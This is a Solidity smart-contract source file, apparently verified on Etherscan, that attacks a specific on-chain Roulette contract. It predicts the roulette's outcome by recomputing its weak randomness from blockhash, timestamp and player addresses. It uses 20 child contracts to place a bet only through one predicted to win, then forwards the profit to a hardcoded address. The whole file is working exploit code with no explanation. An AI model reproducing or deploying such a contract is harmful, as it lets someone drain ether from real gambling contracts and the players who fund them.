/**

 *Submitted for verification at Etherscan.io on 2018-12-14

*/



pragma solidity ^0.4.24;





contract Roulette {

    function players(uint256 index) public view returns(address);

}





contract Child {

    function() public payable {

    }

    

    function win(address target) public payable {

        require(target.call.value(msg.value)());

        msg.sender.transfer(address(this).balance);

    }

}





contract AWinner {

    Roulette public roulette = Roulette(0x843311a93665de5a3e7D68909862A1A7412f9BC3);

    

    Child[] public children;

    

    constructor() public payable {

        for (uint i = 0; i < 20; i++) {

            children.push(new Child());

        }

        win();

    }

    

    function win() public payable {

        uint256 prevBalance = address(this).balance;

        for (uint i = getPlayersLength(); i < 4; i++) {

            require(address(roulette).call.value(1 ether)());

        }

        

        for (i = 0; i < children.length; i++) {

            if (getRandom(children[i]) % 5 == 0) {

                children[i].win.value(1 ether)(roulette);

                break;

            }

        }

        

        require(address(this).balance > prevBalance);

        address(0x083fc10cE7e97CaFBaE0fE332a9c4384c5f54E45).transfer(address(this).balance);

    }

    

    function getPlayer(uint256 index) public view returns(address) {

        return roulette.players(index);

    }

    

    function getPlayersLength() public view returns(uint256) {

        for (uint i = 0; i < 10; i++) {

            if (!address(roulette).call.gas(0x400)(abi.encodeWithSelector(roulette.players.selector, i))) {

                return i;

            }

        }

        return 0;

    }

    

    function getRandom(address lastPlayer) internal view returns(uint256) {

        uint256 num = uint256(keccak256(abi.encodePacked(blockhash(block.number - 5), now)));



        for (uint i = 0; i < 5 - 1; i++) {

            num ^= uint256(keccak256(abi.encodePacked(blockhash(block.number - i), uint256(getPlayer(i)) ^ num)));

        }

        

        num ^= uint256(keccak256(abi.encodePacked(blockhash(block.number - i), uint256(lastPlayer) ^ num)));



        return num;

    }

}